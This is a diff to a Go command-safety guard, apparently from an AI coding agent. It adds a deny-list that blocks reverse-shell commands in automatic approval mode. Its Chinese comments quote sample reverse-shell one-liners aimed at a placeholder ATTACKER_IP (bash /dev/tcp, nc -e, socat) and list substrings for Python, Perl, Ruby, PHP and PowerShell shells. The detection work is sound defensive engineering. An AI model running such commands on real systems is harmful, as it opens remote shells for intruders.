@@ -609,11 +609,90 @@ func guardDangerousCommand(payload commandArguments, config internalconfig.Confi
 			return newToolError("PERMISSION_DENIED", "检测到高风险命令，请切换到允许模式后再执行")
 		}
 	}
+	// 反向 Shell 探测拦截：检测通过 shell 命令建立反向连接的行为。
+	if strings.TrimSpace(config.ApprovalMode) == "auto" {
+		if err := guardReverseShell(payload, preview); err != nil {
+			return err
+		}
+	}
 	// 敏感文件访问拦截：检测通过 shell 命令读取系统密码文件、
 	// SSH 密钥、云平台凭证等敏感路径的行为。
 	if strings.TrimSpace(config.ApprovalMode) == "auto" {
 		if err := guardSensitiveFileAccess(payload, preview); err != nil {
 			return err
+		}
+	}
+	return nil
+}
+
+// guardReverseShell 检测 shell 命令中是否包含反向 Shell（reverse shell）探测行为。
+// 反向 Shell 是攻击者从目标机器主动连接到外部监听端口，将 stdin/stdout/stderr
+// 重定向到网络连接，从而获得交互式 Shell 的技术。
+// 该检测在 auto 审批模式下生效，覆盖以下常见变体：
+//   - Bash /dev/tcp 反向 Shell
+//   - nc / ncat -e 或 -c 反向 Shell
+//   - Python socket 反向 Shell
+//   - Perl socket 反向 Shell
+//   - Ruby socket 反向 Shell
+//   - PHP socket 反向 Shell
+//   - Socat 双向管道反向 Shell
+//   - PowerShell 反向 Shell
+func guardReverseShell(payload commandArguments, preview string) error {
+	reverseShellPatterns := []string{
+		// Bash /dev/tcp 反向 Shell
+		// 经典写法: bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+		"/dev/tcp/",
+		"/dev/udp/",
+		"bash -i >&",
+		"sh -i >&",
+		// nc / ncat 反向 Shell
+		// nc -e /bin/sh ATTACKER_IP PORT
+		// ncat -e /bin/sh ATTACKER_IP PORT
+		"nc -e ",
+		"ncat -e ",
+		"nc -c ",
+		"ncat -c ",
+		// Python socket 反向 Shell
+		// python -c 'import socket,subprocess,os;os.dup2(...)...'
+		"import socket,subprocess,os",
+		"socket.socket(socket.af_inet",
+		"socket.socket(socket",
+		"os.dup2(",
+		// Perl socket 反向 Shell
+		// perl -e 'use Socket; ...'
+		"use socket;",
+		"socket(socket_pf_inet",
+		// Ruby socket 反向 Shell
+		// ruby -rsocket -e '...'
+		"ruby -rsocket",
+		"-rsocket",
+		"tcpsocket.open",
+		"tcpsocket.new",
+		// PHP socket 反向 Shell
+		// php -r '$sock=fsockopen(...)...'
+		"fsockopen(",
+		"socket_create(",
+		// Socat 反向 Shell
+		// socat tcp-connect:ATTACKER_IP:PORT exec:...
+		"socat tcp",
+		"socat exec",
+		"exec:sh,pty",
+		// PowerShell 反向 Shell
+		// powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(...)"
+		"new-object system.net.sockets.tcpclient",
+		"system.net.sockets.tcpclient",
+		"invoke-tcpclient",
+		// 通用反向 Shell 特征：文件描述符重定向组合
+		// 仅拦截 0>&1（stdin→stdout），这是反向 Shell 最典型的特征
+		"0>&1",
+		// mkfifo + nc 组合
+		"mkfifo /tmp/",
+		// Telnet 反向 Shell
+		"telnet ",
+	}
+	for _, pattern := range reverseShellPatterns {
+		if strings.Contains(preview, pattern) {
+			return newToolError("PERMISSION_DENIED", "检测到反向 Shell 探测行为（%s），请切换到允许模式后再执行", pattern)
 		}
 	}
 	return nil
